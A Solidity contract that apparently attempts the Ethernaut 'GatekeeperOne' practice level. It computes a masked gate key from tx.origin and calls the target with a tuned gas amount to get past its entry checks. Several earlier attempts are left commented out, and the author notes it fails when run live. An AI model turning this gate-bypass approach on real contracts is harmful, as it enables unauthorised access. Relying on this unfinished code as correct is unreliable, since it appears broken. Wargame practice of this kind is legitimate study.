// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './GatekeeperOne.sol';

// interface IGateKeeperOne {
//   function entrant() external view returns (address);
//   function enter(bytes8) external returns (bool);
// }

contract GatekeeperOneHack {
  GatekeeperOne public gatekeeper;
  address public owner;

  constructor(address _gatekeeperContract) public payable {
    gatekeeper = GatekeeperOne(_gatekeeperContract);
    owner = payable(address(msg.sender));
  }


  function enterGate(uint256 _gas) external {
    require(msg.sender == owner);
    uint16 k16 = uint16(uint160(tx.origin));
    uint64 k64 = uint64(1 << 63) + uint64(k16);
    bytes8 key = bytes8(k64);

    bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
    // bytes8 key = bytes8(uint64(uint160(address(0x359bfB5160946a55f03c080c2DC6975C8F970d5C)))) & 0xFFFFFFFF0000FFFF;
    // require(tx.origin == 0x359bfB5160946a55f03c080c2DC6975C8F970d5C, 'fail');
    // require(gatekeeper.enter{ gas: 8191 * 10 + _gas}(key), "failed");
    // (bool sent ) = gatekeeper.enter{ gas: 82166}(key);
    (bool sent ) = gatekeeper.enter{ gas: _gas}(gateKey);
    // require(sent);
    // require(gatekeeper.enter{ gas: 82166}(key), "failed");
    // require(gatekeeper.entrant() == 0x359bfB5160946a55f03c080c2DC6975C8F970d5C, "failed, wrong entrant");
    // This passes... but when run live I dont get entrant. Not sure why
  }
}